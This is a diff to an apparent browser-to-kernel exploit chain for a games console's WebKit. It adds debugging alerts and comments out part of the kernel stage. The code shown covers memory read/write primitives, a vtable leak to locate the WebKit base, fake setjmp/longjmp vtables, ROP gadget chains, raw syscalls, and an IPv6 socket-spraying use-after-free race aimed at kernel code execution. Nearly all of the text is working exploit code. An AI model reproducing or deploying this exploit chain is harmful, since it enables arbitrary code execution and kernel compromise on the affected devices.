@@ -34,6 +34,11 @@ var g_jsview_butterfly = null;
 var g_message_heading_leak = null;
 var g_message_body_leak = null;
 
+var fakeVtable_setjmp;
+var fakeVtable_longjmp;
+var original_context;
+var modified_context;
+
 var g_obj_str = {};
 
 var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
@@ -50,6 +55,7 @@ var slave_addr;
 var slave_buf_addr;
 var master_addr;
 
+
 var prim;
 var chain;
 var nogc = [];
@@ -59,6 +65,9 @@ var libKernelBase;
 
 var syscalls = {};
 var gadgets = {};
+
+var textAreaVtPtr;
+var textAreaVtable;
 
 const OFFSET_wk_vtable_first_element    = 0x00722C20; // match
 const OFFSET_WK_fclose_import           = 0x021A6468; // match, this will be the import for libcinternal, it's the address of address
@@ -653,10 +662,10 @@ function setupRW() {
 	
 	debug_log("about to enter stage2 in a sec...");
 	//pointer to vtable address
-	var textAreaVtPtr = prim.read8(prim.leakval(textArea).add32(0x18));
+	textAreaVtPtr = prim.read8(prim.leakval(textArea).add32(0x18));
 	debug_log("textAreaVtPtr: 0x" + textAreaVtPtr);
 	//address of vtable
-	var textAreaVtable = prim.read8(textAreaVtPtr);
+	textAreaVtable = prim.read8(textAreaVtPtr);
 	debug_log("textAreaVtable: 0x" + textAreaVtable);
 	//use address of 1st entry (in .text) to calculate webkitbase
 	webKitBase = prim.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
@@ -680,7 +689,7 @@ function setupRW() {
 		window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
 	}
 	
-	debug_log("after inspector Gadget");
+	//debug_log("after inspector Gadget");
 
 	function malloc(sz) {
 		var backing = new Uint8Array(0x10000 + sz);
@@ -731,14 +740,14 @@ function setupRW() {
 		return str;
 	}
   
-    debug_log("after func decl");
+    //debug_log("after func decl");
 	
-	var fakeVtable_setjmp = malloc32(0x200);
-	var fakeVtable_longjmp = malloc32(0x200);
-	var original_context = malloc32(0x40);
-	var modified_context = malloc32(0x40);
+	fakeVtable_setjmp = malloc32(0x200);
+	fakeVtable_longjmp = malloc32(0x200);
+	original_context = malloc32(0x40);
+	modified_context = malloc32(0x40);
 	
-	debug_log("after malloc32");
+	//debug_log("after malloc32");
 	
 	
 
@@ -754,7 +763,7 @@ function setupRW() {
 	prim.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_lc_longjmp));
 	prim.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
 
-	debug_log("after vtable write");
+	//debug_log("after vtable write");
 	
 	
 	
@@ -775,19 +784,19 @@ function setupRW() {
 		prim.write8(textAreaVtPtr, textAreaVtable);
 	}
 	
-	debug_log("after launch_chain decl");
+	//debug_log("after launch_chain decl");
 
 	var kview = new Uint8Array(0x1000);
 	var kstr = prim.leakval(kview).add32(0x10);
 	var orig_kview_buf = prim.read8(kstr);
 	
-	debug_log("after kview");
+	//debug_log("after kview");
 
 	prim.write8(kstr, window.libKernelBase);
 	prim.write4(kstr.add32(8), 0x40000);
 	var countbytes;
 	
-	debug_log("after kstr");
+	//debug_log("after kstr");
 	
 	/*
 	0x014: 0x31c30, // sys_getpid 20
@@ -818,26 +827,31 @@ function setupRW() {
 	
 
 	
-	debug_log("after syscalls");
+	//debug_log("after syscalls");
 
 	prim.write8(kstr, orig_kview_buf);
-	debug_log("after write8");
+	//debug_log("after write8");
 	
 	
 	
 	chain = new rop();
-	debug_log("new rop");
-	if (chain.syscall(23, 0).low != 0x0) {
-		debug_log("try stage3");	
-		try {
-			stage3();
+	//debug_log("new rop");
+	try{
+		if (chain.syscall(23, 0).low != 0x0) {
+			alert("try stage3");	
+			try {
+				stage3();
+			} catch (e) {
+				alert(e);
+			}
+		}
+		else {
+			alert("getpid is 0!");
+		}
 		} catch (e) {
 			alert(e);
 		}
-	}
-	else {
-		debug_log("getpid is 0!");
-	}
+	
 	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
 	var payload_loader = malloc32(0x1000);
 
@@ -980,6 +994,8 @@ function stage3() {
     size_of_fix_these_sockets
   );
 
+  alert("after malloc");
+
   const triggered = var_memory;
   const valid_pktopts = triggered.add32(size_of_triggered);
   const size_of_tclass = valid_pktopts.add32(size_of_valid_pktopts);
@@ -1012,6 +1028,8 @@ function stage3() {
   var target_file;
   var socketops;
   var kernel_base;
+  
+  alert("after const decl");
 
   prim.write8(valid_pktopts.add32(0x0), 0x14);
   prim.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
@@ -1030,7 +1048,7 @@ function stage3() {
 
   prim.write8(pktinfo_buffer_len, 0x14);
 
-  debug_log("create_sockets!");
+  alert("create_sockets!");
   //create sockets
   const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
   const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
@@ -1053,9 +1071,11 @@ function stage3() {
       chain.write_result4(slave_sockets_ptr.add32(0x4 * i));
     }
   }
+  
   chain.run();
-  debug_log("run chain!");
-
+  
+  alert("run chain!");
+	
   const spray_sockets = array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
   const spray_socks_tclasses = array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);
 
@@ -1076,6 +1096,7 @@ function stage3() {
 
   fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
   fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;
+  alert("master and slave sockets!");
 
   for (var i = 0; i < 10; i++) {
     prim.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
@@ -1084,14 +1105,23 @@ function stage3() {
 
   var thr1_start;
   var thr1_ctrl;
-  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
-    const loop_start = new_thr.get_rsp();
-    const trigger_condition = new_thr.create_equal_branch(triggered, 1);
+  alert("thread start!");
 
+  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
+	 
+	  
+    const loop_start = new_thr.get_rsp();
+	alert("before trigger_condition");
+    
+	const trigger_condition = new_thr.create_equal_branch(triggered, 1);
+
+	
+	
     const triggered_false = new_thr.get_rsp();
     new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
     const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);
 
+	alert("before overlap_false");
     const overlap_false = new_thr.get_rsp();
     new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
     new_thr.push(window.gadgets["pop rdi"]);
@@ -1103,7 +1133,7 @@ function stage3() {
     new_thr.push(window.gadgets["pop rsp"]);
     var l2 = new_thr.get_rsp();
     new_thr.push(0x43434343);
-
+	alert("after 434343");
     new_thr.finalizeSymbolic(dest_idx, l2);
     new_thr.finalizeSymbolic(src_idx, l1);
     thr1_start = loop_start;
@@ -1111,20 +1141,24 @@ function stage3() {
 
     const overlap_true = new_thr.get_rsp();
     new_thr.push_write8(triggered, 1);
-
+	alert("after overlap_true");
     const triggered_true = new_thr.get_rsp();
     new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
-
+	alert("set_branch_points");
     new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
     new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
+	
   });
 
   //boys dont race too fast now, kthx.
-  debug_log("boys dont race too fast now, kthx.");
+  alert("boys dont race too fast now, kthx.");
+
   var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
   var prio = malloc(0x8);
   prim.write4(prio, 0x100);
   var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
+  
+  alert("setting threads... 1");
 
   const thread3 = new rop(); {
     //main loop
@@ -1156,8 +1190,11 @@ function stage3() {
     thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
   }
   //trigger uaf
-  debug_log("trigger uaf");
+  alert("trigger uaf");
+  /*
   thread1();
+  alert("thread 1");
+
   thread3.run();
 
   function find_socket_overlap() {
@@ -1331,8 +1368,9 @@ function stage3() {
     target_file = kernel_read8(ofiles.add32(0x8 * target_socket))
     socketops = kernel_read8(target_file.add32(FILE_FOPS_OFFSET));
   }
+      
   //lower priority
-  debug_log("//lower priority");
+  alert("//lower priority");
   prim.write4(prio, 0x1FF);
   chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
   //find uaf
@@ -1482,6 +1520,7 @@ function stage3() {
   chain.syscall(54, target_socket, 0x20001111, 0);
   //alert("executed in kernel");
   //prim.write8(0, 0);
+  */
 }
 
 function read(addr, length) {
